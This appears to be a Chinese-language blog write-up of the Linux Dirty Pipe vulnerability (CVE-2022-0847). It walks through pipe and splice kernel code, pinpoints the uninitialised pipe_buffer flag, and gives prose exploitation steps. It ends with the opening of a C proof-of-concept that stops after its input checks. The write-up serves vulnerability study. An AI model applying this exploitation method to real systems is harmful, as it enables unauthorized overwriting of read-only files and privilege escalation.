<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>dirtypipe CVE-2022-0847</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="./index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="./about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./dirtypipe CVE-2022-0847.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">dirtypipe CVE-2022-0847</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-06-24]</div>
    </header>
    <div class="layout-grid">
                <main><blockquote>
<p>下面使用 Linux 5.13.19 内核源码</p>
</blockquote>
<h2 id="pipe">pipe</h2><p>pipe部分参考<a href="0%20basic/pipe%E7%BB%93%E6%9E%84%E4%BD%93.md">pipe结构体</a>
重点：</p>
<ul>
<li>写入操作申请新内存页时，通常会初始化<code>pipe_buffer-&gt;flag</code>为<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
<li>是向管道写入数据时，管道非空且上一个<code>pipe_buffer</code>未满，并存在<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志时，则会尝试向此<code>pipe_buffer</code>写入数据</li>
</ul>
<h2 id="slice">slice</h2><p>文件与管道间数据拷贝</p>
<p>当想要将一个文件数据拷贝到另一个文件时，朴素的方法是打开文件后将源文件数据读入后再写入目标文件，这样需要在用户空间与内核空间来回进行数据拷贝，有较大开销
<img src="./images/Pasted%20image%2020250615210011.png" alt="" /></p>
<p>引入splice 零拷贝 只需要2次上下文切换
作用是在文件与管道之间进行数据拷贝，从而将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，避免数据在用户空间与内核空间之间的拷贝造成的开销
<img src="./images/Pasted%20image%2020250615210057.png" alt="" /></p>
<p>glibc中wrapper如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE         </span><span style="color:#65737e;">/* See feature_test_macros(7) */
</span><span style="color:#c0c5ce;">       </span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">       ssize_t </span><span style="color:#8fa1b3;">splice</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd_in</span><span style="color:#c0c5ce;">, loff_t *</span><span style="color:#bf616a;">off_in</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">fd_out</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">                      loff_t *</span><span style="color:#bf616a;">off_out</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">);
</span></pre>
<p>本质上就是利用管道在内核空间中进行数据拷贝
如果要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，使用<code>splice</code>系统调用将数据从源文件描述符拷贝到管道中、再用<code>splice</code>系统调用将数据从管道拷贝到目的文件描述符，从而只需要两次系统调用</p>
<p>splice 系统调用正式操作前都是一些基础的检查工作，这一块不深入分析，存在如下调用链：</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">SYS_splice()    // 检查文件描述符是否可用
</span><span style="color:#c0c5ce;">    __do_splice()   // 检查是否入设置了偏移或出设置了偏移（任一则返回）（管道不能指定偏移量）
</span><span style="color:#c0c5ce;">        do_splice()     // 分流
</span></pre>
<p>最终文件与管道间的分流发生在 <code>do_splice()</code> 函数：</p>
<ul>
<li>从管道读取到管道，调用 <code>splice_pipe_to_pipe()</code></li>
<li>从文件读取到管道，调用 <code>splice_file_to_pipe()</code></li>
<li>从管道读取到文件，调用 <code>do_splice_from()</code></li>
</ul>
<h3 id="cong-wen-jian-du-qu-dao-guan-dao">从文件读取到管道</h3><p>核心原理：将<code>pipe_buffer</code>对应的page设置为文件映射的page</p>
<p>涉及下面调用链</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">splice_file_to_pipe()
</span><span style="color:#c0c5ce;">    do_splice_to()
</span></pre>
<p>最终执行<code>in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);</code>
调用内核文件结构体函数表的<code>splice_read</code>指针，对于不同文件系统该函数指针不同，<code>ext4</code>中函数指针对应<code>ext4_file_operations</code>，<code>splice_read</code>对应<code>generic_file_splice_read</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> file_operations ext4_file_operations = {
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">llseek		</span><span style="color:#c0c5ce;">= ext4_llseek,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">read_iter	</span><span style="color:#c0c5ce;">= ext4_file_read_iter,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">write_iter	</span><span style="color:#c0c5ce;">= ext4_file_write_iter,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">iopoll		</span><span style="color:#c0c5ce;">= iomap_dio_iopoll,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">unlocked_ioctl </span><span style="color:#c0c5ce;">= ext4_ioctl,
</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_COMPAT
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">compat_ioctl	</span><span style="color:#c0c5ce;">= ext4_compat_ioctl,
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">mmap		</span><span style="color:#c0c5ce;">= ext4_file_mmap,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">mmap_supported_flags </span><span style="color:#c0c5ce;">= MAP_SYNC,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">open		</span><span style="color:#c0c5ce;">= ext4_file_open,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">release	</span><span style="color:#c0c5ce;">= ext4_release_file,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">fsync		</span><span style="color:#c0c5ce;">= ext4_sync_file,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">get_unmapped_area </span><span style="color:#c0c5ce;">= thp_get_unmapped_area,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">splice_read	</span><span style="color:#c0c5ce;">= generic_file_splice_read,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">splice_write	</span><span style="color:#c0c5ce;">= iter_file_splice_write,
</span><span style="color:#c0c5ce;">	.</span><span style="color:#bf616a;">fallocate	</span><span style="color:#c0c5ce;">= ext4_fallocate,
</span><span style="color:#c0c5ce;">};
</span></pre>
<p><code>generic_file_splice_read()</code>内部先调用<code>iov_iter_pipe()</code>，根据管道数据初始化<code>iov_iter</code>结构</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">iov_iter_pipe</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iov_iter *</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">direction</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pipe_inode_info *</span><span style="color:#bf616a;">pipe</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			size_t </span><span style="color:#bf616a;">count</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">BUG_ON</span><span style="color:#c0c5ce;">(direction != READ);
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">WARN_ON</span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pipe_full</span><span style="color:#c0c5ce;">(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;ring_size));
</span><span style="color:#c0c5ce;">	i-&gt;type = ITER_PIPE | READ;
</span><span style="color:#c0c5ce;">	i-&gt;pipe = pipe;
</span><span style="color:#c0c5ce;">	i-&gt;head = pipe-&gt;head;
</span><span style="color:#c0c5ce;">	i-&gt;iov_offset = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	i-&gt;count = count;
</span><span style="color:#c0c5ce;">	i-&gt;start_head = i-&gt;head;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#8fa1b3;">EXPORT_SYMBOL</span><span style="color:#c0c5ce;">(iov_iter_pipe);
</span></pre>
<p>接着调用<code>call_read_iter()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static inline </span><span style="color:#c0c5ce;">ssize_t </span><span style="color:#8fa1b3;">call_read_iter</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">file</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> kiocb *</span><span style="color:#bf616a;">kio</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				     </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iov_iter *</span><span style="color:#bf616a;">iter</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> file-&gt;f_op-&gt;</span><span style="color:#8fa1b3;">read_iter</span><span style="color:#c0c5ce;">(kio, iter);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>所以最终又会调用<code>ext4_file_read_iter</code>
核心调用链如下，最终调用到<code>copy_page_to_iter_pipe()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ext4_file_read_iter()
</span><span style="color:#c0c5ce;">    generic_file_read_iter()
</span><span style="color:#c0c5ce;">        filemap_read()
</span><span style="color:#c0c5ce;">            filemap_get_pages() // 根据长度获取到文件对应映射的页面集
</span><span style="color:#c0c5ce;">            copy_page_to_iter() // 进行页面拷贝（单位为单个页面） 循环处理pvec数组（存放页面集）
</span><span style="color:#c0c5ce;">                __copy_page_to_iter()
</span><span style="color:#c0c5ce;">                    copy_page_to_iter_pipe()    // 我们是管道，所以走入该分支
</span></pre>
<p>注意参数，第一个参数<code>page</code>是文件对应映射的页面，最后一个参数<code>i</code>对应管道（<a href="0%20basic/iov_iter.md">iov_iter</a>）
先取出当前<code>pipe_buffer</code>，如果当前管道缓冲区偏移不为0，且管道缓冲区偏移和文件偏移一样 &amp;&amp; 管道页面和文件页面相同，则进行合并；否则无法合并，管道head自增1，取出新的<code>pipe_buffer</code></p>
<p>之后判断确保管道空间未满，按照文件页面设置<code>pipe_buffer</code>，<code>get_page()</code>增加页面引用计数，核心是<code>buf-&gt;page = page;</code>直接将该<code>pipe_buffer</code>页面设置为文件页面，从而利用<strong>管道映射文件数据</strong></p>
<p>最后管道head自增1，更新管道<code>iov_iter</code>数据</p>
<blockquote>
<p>注意到 这里对于读入数据偏移和长度的控制，是直接通过设置<code>pipe_buffer</code>的<code>offset</code>和<code>len</code>控制的，对于文件页面是直接映射的</p>
</blockquote>
<p>上述操作存在的问题：<strong>缺少对<code>pipe_buffer-&gt;flags</code>重新赋值</strong></p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">copy_page_to_iter_pipe</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> page *</span><span style="color:#bf616a;">page</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">offset</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			 </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iov_iter *</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pipe_inode_info *pipe = i-&gt;pipe;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pipe_buffer *buf;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> p_tail = pipe-&gt;tail;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> p_mask = pipe-&gt;ring_size - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> i_head = i-&gt;head;
</span><span style="color:#c0c5ce;">	size_t off;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(bytes &gt; i-&gt;count))
</span><span style="color:#c0c5ce;">		bytes = i-&gt;count;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(!bytes))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">sanity</span><span style="color:#c0c5ce;">(i))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	off = i-&gt;iov_offset;
</span><span style="color:#c0c5ce;">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(off) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset == off &amp;&amp; buf-&gt;page == page) {
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* merge with the last one */
</span><span style="color:#c0c5ce;">			buf-&gt;len += bytes;
</span><span style="color:#c0c5ce;">			i-&gt;iov_offset += bytes;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> out;
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">		i_head++;
</span><span style="color:#c0c5ce;">		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">pipe_full</span><span style="color:#c0c5ce;">(i_head, p_tail, pipe-&gt;max_usage))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">get_page</span><span style="color:#c0c5ce;">(page);
</span><span style="color:#c0c5ce;">	buf-&gt;page = page;
</span><span style="color:#c0c5ce;">	buf-&gt;offset = offset;
</span><span style="color:#c0c5ce;">	buf-&gt;len = bytes;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	pipe-&gt;head = i_head + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	i-&gt;iov_offset = offset + bytes;
</span><span style="color:#c0c5ce;">	i-&gt;head = i_head;
</span><span style="color:#c0c5ce;">out:
</span><span style="color:#c0c5ce;">	i-&gt;count -= bytes;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> bytes;
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="cong-guan-dao-du-qu-dao-wen-jian">从管道读取到文件</h3><p><code>do_splice_from</code> 最终会调用对应内核文件结构的函数表中的 <code>splice_write()</code> 指针，将 pipe_buffer 数组对应页面上内容读出，写入到文件中，对于不同的文件系统而言该函数指针不同</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * Attempt to initiate a splice from pipe to file.
</span><span style="color:#65737e;"> */
</span><span style="color:#b48ead;">static long </span><span style="color:#8fa1b3;">do_splice_from</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pipe_inode_info *</span><span style="color:#bf616a;">pipe</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file *</span><span style="color:#bf616a;">out</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">			   loff_t *</span><span style="color:#bf616a;">ppos</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">unlikely</span><span style="color:#c0c5ce;">(!out-&gt;f_op-&gt;splice_write))
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">warn_unsupported</span><span style="color:#c0c5ce;">(out, &quot;</span><span style="color:#a3be8c;">write</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> out-&gt;f_op-&gt;</span><span style="color:#8fa1b3;">splice_write</span><span style="color:#c0c5ce;">(pipe, out, ppos, len, flags);
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>ext4文件系统中，最终调用到<code>iter_file_splice_write</code>函数，之后存在如下调用链</p>
<pre style="background-color:#2b303b;">
<span style="color:#8fa1b3;">iter_file_splice_write</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">splice_from_pipe_next</span><span style="color:#c0c5ce;">() </span><span style="color:#65737e;">// 检查管道可用性
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">vfs_iter_write</span><span style="color:#c0c5ce;">() </span><span style="color:#65737e;">// 读出管道数据写入文件
</span><span style="color:#c0c5ce;">		</span><span style="color:#8fa1b3;">do_iter_write</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">			</span><span style="color:#8fa1b3;">do_iter_readv_writev</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">				</span><span style="color:#8fa1b3;">call_write_iter</span><span style="color:#c0c5ce;">() </span><span style="color:#65737e;">//传入type为write
</span></pre>
<h2 id="lou-dong-fen-xi">漏洞分析</h2><ul>
<li>将管道整个读写一轮，此时所有<code>pipe_buffer</code>都保留了<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
<li>利用splice将数据从文件读取一个字节到管道上，此时 pipe_buffer 对应page指向文件映射的页面，splice 中没有清空pipe_buffer标志位</li>
<li>splice 建立完页面映射后，head 指向下一个<code>pipe_buffer</code>。此时接着往管道写入数据，会发现上一个<code>pipe_buffer</code>还没有满（<code>struct pipe_buffer *buf = &amp;pipe-&gt;bufs[(head - 1) &amp; mask];</code>）、且能够容纳要写入的数据长度、且其标志位为<code>PIPE_BUF_FLAG_CAN_MERGE</code>，因此内核会认为该页面可以被写入，从而完成越权写入文件操作</li>
</ul>
<h2 id="lou-dong-li-yong">漏洞利用</h2><ul>
<li>先把管道全部全部读写一遍，这样的话管道会初始化所有的<code>pipe_buffer</code>，设置标志位<code>PIPE_BUF_FLAG_CAN_MERGE</code></li>
<li>之后用<code>splice</code>系统调用将数据从目标文件读入管道，从而<code>pipe_buffer-&gt;page</code>变成文件在内存中映射的页面</li>
<li>将文件数据读入管道后，管道head指向下一个<code>pipe_buffer</code>，继续写入数据，此时会检查上一个管道如果空间够且标志位为<code>PIPE_BUF_FLAG_CAN_MERGE</code>则直接从上一个管道开始写入数据，从而越权写入文件</li>
</ul>
<h2 id="poc">poc</h2><pre style="background-color:#2b303b;">
<span style="color:#65737e;">/*
</span><span style="color:#65737e;"> * POC of CVE-2022-0847
</span><span style="color:#65737e;"> * written by arttnba3
</span><span style="color:#65737e;"> */
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/user.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">msg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[31m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[x] Error : </span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, msg);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">envp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;">            page_size;
</span><span style="color:#c0c5ce;">    size_t          offset_in_file;
</span><span style="color:#c0c5ce;">    size_t          data_size;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             target_file_fd;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> stat     target_file_stat;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             pipe_fd[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             pipe_size;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char            </span><span style="color:#c0c5ce;">*buffer;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">             retval;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// checking before we start to exploit
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(argc &lt; </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Usage: ./exp target_file offset_in_file data</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(EXIT_FAILURE);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    page_size = </span><span style="color:#8fa1b3;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE);
</span><span style="color:#c0c5ce;">    offset_in_file = </span><span style="color:#96b5b4;">strtoul</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset_in_file % page_size == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot write on the boundary of a page!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    target_file_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], O_RDONLY);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(target_file_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Failed to open the target file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">fstat</span><span style="color:#c0c5ce;">(target_file_fd, &amp;target_file_stat))
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Failed to get the info of the target file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(offset_in_file &gt; target_file_stat.</span><span style="color:#bf616a;">st_size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Offset is not in the file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    data_size = </span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((offset_in_file + data_size) &gt; target_file_stat.</span><span style="color:#bf616a;">st_size</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot enlarge the file!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(((offset_in_file % page_size) + data_size) &gt; page_size)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Cannot write accross a page!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
